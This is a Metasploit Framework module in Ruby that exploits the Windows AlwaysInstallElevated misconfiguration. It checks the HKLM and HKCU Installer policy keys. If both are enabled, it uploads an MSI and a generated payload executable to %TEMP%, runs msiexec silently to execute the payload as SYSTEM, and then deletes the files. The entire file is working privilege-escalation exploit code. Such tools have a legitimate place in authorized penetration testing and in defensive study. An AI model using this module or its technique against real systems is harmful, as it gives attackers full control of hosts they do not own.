##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Exploit::Local
	Rank = AverageRanking

	include Msf::Exploit::EXE
	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Windows::Registry

	def initialize(info={})
		super(update_info(info, {
			'Name'          => 'Windows AlwaysInstallElevated MSI',
			'Description'    => %q{
					This module checks the AlwaysInstallElevated registry keys which dictate if
				.MSI files should be installed with elevated privileges (NT AUTHORITY\SYSTEM).

				The default MSI file is data/exploits/exec_payload.msi with the WiX source file
				under external/source/exploits/exec_payload_msi/exec_payload.wxs. This MSI simply
				executes payload.exe within the same folder.

				The MSI may not execute succesfully successive times, but may be able to get around
				this by regenerating the MSI.

				MSI can be rebuilt from the source using the WIX tool with the following commands:
				candle exec_payload.wxs
				light exec_payload.wixobj
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Ben Campbell',
					'Parvez Anwar' # discovery?/inspiration
				],
			'Arch'          => [ ARCH_X86, ARCH_X86_64 ],
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'DefaultOptions' =>
				{
					'WfsDelay' => 10,
					'EXITFUNC' => 'thread',
					'InitialAutoRunScript' => 'migrate -k -f'
				},
			'Targets'       =>
				[
					[ 'Windows', { } ],
				],
			'References'    =>
				[
					[ 'URL', 'http://www.greyhathacker.net/?p=185' ],
					[ 'URL', 'http://msdn.microsoft.com/en-us/library/aa367561(VS.85).aspx' ],
					[ 'URL', 'http://wix.sourceforge.net'] ,
				],
			'DisclosureDate'=> 'Mar 18 2010',
			'DefaultTarget' => 0
		}))

		register_advanced_options([
			OptString.new('LOG_FILE', [false, 'Remote path to output MSI log file to.', nil]),
			OptBool.new('QUIET', [true, 'Run the MSI with the /quiet flag.', true])
		], self.class)
	end

	def check
		install_elevated = "AlwaysInstallElevated"
		installer = "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
		hkcu = "HKEY_CURRENT_USER\\#{installer}"
		hklm = "HKEY_LOCAL_MACHINE\\#{installer}"

		local_machine_value = registry_getvaldata(hklm,install_elevated)

		if local_machine_value.nil?
			print_error("#{hklm}\\#{install_elevated} does not exist or is not accessible.")
			return Msf::Exploit::CheckCode::Safe
		elsif local_machine_value == 0
			print_error("#{hklm}\\#{install_elevated} is #{local_machine_value}.")
			return Msf::Exploit::CheckCode::Safe
		else
			print_good("#{hklm}\\#{install_elevated} is #{local_machine_value}.")
			current_user_value = registry_getvaldata(hkcu,install_elevated)
		end

		if current_user_value.nil?
			print_error("#{hkcu}\\#{install_elevated} does not exist or is not accessible.")
			return Msf::Exploit::CheckCode::Safe
		elsif current_user_value == 0
			print_error("#{hkcu}\\#{install_elevated} is #{current_user_value}.")
			return Msf::Exploit::CheckCode::Safe
		else
			print_good("#{hkcu}\\#{install_elevated} is #{current_user_value}.")
			return Msf::Exploit::CheckCode::Vulnerable
		end
	end

	def cleanup
		if not @executed
			return
		end

		begin
			print_status("Deleting MSI...")
			file_rm(@msi_destination)
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error(e.to_s)
			print_error("Failed to delete MSI #{@msi_destination}, manual cleanup may be required.")
		end

		begin
			print_status("Deleting Payload...")
			file_rm(@payload_destination)
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error(e.to_s)
			print_error("Failed to delete payload #{@payload_destination}, this is expected if the exploit is successful, manual cleanup may be required.")
		end
	end

	def exploit

		if check != Msf::Exploit::CheckCode::Vulnerable
			@executed = false
			return
		end

		@executed = true

		msi_filename = "exec_payload.msi" # Rex::Text.rand_text_alpha((rand(8)+6)) + ".msi"
		msi_source = ::File.join(Msf::Config.install_root, "data", "exploits", "exec_payload.msi")

		# Upload MSI
		@msi_destination = expand_path("%TEMP%\\#{msi_filename}").strip # expand_path in Windows Shell adds a newline and has to be stripped
		print_status("Uploading the MSI to #{@msi_destination} ...")

		#upload_file - ::File.read doesn't appear to work in windows...
		source = File.open(msi_source, "rb"){|fd| fd.read(fd.stat.size) }
		write_file(@msi_destination, source)

		# Upload payload
		payload = generate_payload_exe
		@payload_destination = expand_path("%TEMP%\\payload.exe").strip
		print_status("Uploading the Payload to #{@payload_destination} ...")
		write_file(@payload_destination, payload)

		# Execute MSI
		print_status("Executing MSI...")

		if datastore['LOG_FILE'].nil?
			logging = ""
		else
			logging = "/l* #{datastore['LOG_FILE']} "
		end

		if datastore['QUIET']
			quiet = "/quiet "
		else
			quiet = ""
		end

		cmd = "msiexec.exe #{logging}#{quiet}/package #{@msi_destination}"
		vprint_status("Executing: #{cmd}")
		begin
			result = cmd_exec(cmd)
		rescue Rex::TimeoutError
			vprint_status("Execution timed out.")
		end
		vprint_status("MSI command-line feedback: #{result}")
	end
end
